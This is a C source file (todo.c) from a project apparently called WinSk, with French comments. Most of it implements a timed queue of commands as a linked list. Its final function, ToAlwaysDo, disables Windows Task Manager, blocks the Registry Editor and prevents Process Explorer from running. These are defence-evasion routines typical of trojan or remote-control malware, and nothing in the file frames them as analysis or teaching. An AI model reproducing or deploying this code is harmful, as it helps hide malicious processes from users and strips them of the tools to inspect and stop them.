//=============================================================================
// Projet : WinSk
// Fichier : todo.c
//
//=============================================================================

#include "resources.h"


//=============================================================================
//                              Fonctions
//=============================================================================

ToDo* create_ToDo(ToDo *ToDoList, char *commande, int time) {
        ToDo *newToDo = (ToDo*) malloc(sizeof(ToDo));
        if (newToDo != NULL){
            newToDo->id = get_next_id(ToDoList);
            lstrcpy(newToDo->commande, commande);
            newToDo->time = time;
            newToDo->next = NULL;
        }
        return newToDo;
}

int get_next_id(ToDo *ToDoList) {
        ToDo *iterToDo;
        int id = 1;
        for (iterToDo = ToDoList; iterToDo != NULL; iterToDo = iterToDo->next) {
            if (iterToDo->id >= id) {
                id = iterToDo->id + 1;
            }
        }
        return id;
}

void free_ToDo(ToDo *ToDoList) {
        // si la ToDoList n'est pas vide
        if (ToDoList != NULL) {
            if (ToDoList->next != NULL) {
                free_ToDo(ToDoList->next);
            }
            free(ToDoList);
        }
}

ToDo* add_ToDo(ToDo *ToDoList, char *commande, int time) {
        ToDo *newToDo = create_ToDo(ToDoList, commande, time);
        if (newToDo != NULL) {
            newToDo->next = ToDoList;
        }
        return newToDo;
}

ToDo* push_ToDo(ToDo *ToDoList, char *commande, int time) {
        // création du nouveau node
        ToDo *newToDo = create_ToDo(ToDoList, commande, time);
        // si la ToDoList n'est pas vide
        if (ToDoList != NULL) {
            // on cherche le dernier node
            ToDo* current = ToDoList;
            while (current->next != NULL) {
                current = current->next;
            }
            // et on insert le nv node juste après
            current->next = newToDo;
            
            return ToDoList;
        }
        else
            return newToDo;
}

ToDo* pop_ToDo(ToDo *ToDoList) {
        // si la ToDoList n'est pas vide
        if (ToDoList != NULL) {
            // on supprime le 1er node et on retourne celui d'après
            ToDo *nextToDo = ToDoList->next;
            free(ToDoList);
            
            return nextToDo;
        }
        else
            return ToDoList;
}

ToDo* delete_ToDo(ToDo *ToDoList, int id) {
        // on cherche le todo correspondant a l'id
        ToDo *currentToDo, *prevToDo = NULL;
        for (currentToDo = ToDoList; currentToDo != NULL; currentToDo = currentToDo->next) {
            if (currentToDo->id == id) {
                ToDo *nextToDo = currentToDo->next;
                free(currentToDo);
                // s'il y'a un node avant
                if (prevToDo != NULL) {
                    // et un node apres
                    if (nextToDo != NULL) {
                        prevToDo->next = nextToDo;
                    }
                    // si nn, s'il y'a juste le node d'avant
                    else {
                        prevToDo->next = NULL;
                    }
                }
                // si nn, s'il y'a juste le node d'après
                else if (nextToDo != NULL) {
                    ToDoList = nextToDo;
                }
                // si nn, si la liste est vide
                else {
                    ToDoList = NULL;
                }
                break; // on sort de la boucle
            }
            prevToDo = currentToDo;
        }
        
        return ToDoList;
}

void ToAlwaysDo() {
        BOOL resultat; // pour éviter les multiple redéfinition
        
        // On désactive le Gestionnaire des tâches
        #if DISABLE_TASK_MANAGER == TRUE
        resultat = setTaskManager(OFF);
        #if NO_GUI == FALSE
        appendToRichConsole("[ToAlwaysDo] Disable Task Manager", resultat ? "OK" : "KO");
        #endif
        #endif
        
        // On désactive l'accès à l'éditeur de registre
        #if DISABLE_REGISTRY_EDITOR == TRUE
        resultat = setRegistryEditor(OFF);
        #if NO_GUI == FALSE
        appendToRichConsole("[ToAlwaysDo] Disable Registry Editor", resultat ? "OK" : "KO");
        #endif
        #endif
        
        // On désactive le lancement de "procexp.exe"
        #if DISABLE_TASK_MANAGER == TRUE
        resultat = disallowExeRun("procexp.exe", "1");
        #if NO_GUI == FALSE
        appendToRichConsole("[ToAlwaysDo] Disallow Run procexp.exe", resultat ? "OK" : "KO");
        #endif
        #endif
}
